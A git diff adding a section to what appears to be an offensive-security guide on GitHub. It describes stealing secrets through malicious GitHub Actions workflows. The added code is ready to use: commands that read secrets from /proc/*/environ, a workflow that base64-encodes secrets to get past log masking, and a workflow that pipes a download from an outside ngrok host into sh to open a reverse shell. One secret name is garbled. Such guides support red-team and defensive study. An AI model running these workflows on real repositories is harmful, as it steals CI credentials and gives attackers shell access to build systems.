@@ -68,4 +68,50 @@ Note that if you **manage to steal the `user_session` cookie** (currently config
 
 ### With Malicious Github Action
 
+In case you can **execute arbitrary github actions** in a **repository**, you can **steal the secrets from that repo**.
+
+In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.
+
+In case you somehow managed to **infiltrate inside a Github Action**, if you can escalate privileges you can **steal secrets from the processes the secrets have been set in**. In some cases you don't even need to escalate privileges.
+
+```bash
+cat /proc/<proc_number>/environ
+cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
+```
+
+#### List secrets in Github Action output
+
+```yaml
+name: list_env
+on:
+  workflow_dispatch:
+jobs:     
+  List_env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: List Env
+        # Need to base64 encode or github will change the secret value for "***"
+        run: sh -c 'env | grep "secret_" | base64 -w0'
+        env:
+          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
+          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
+```
+
+#### Get reverse shell with secrets
+
+```yaml
+name: revshell
+on:
+  workflow_dispatch:
+jobs:     
+  create_pull_request:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get Rev Shell
+        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
+        env:
+          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
+          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
+```
+
 ### Bypassing Branch Protection
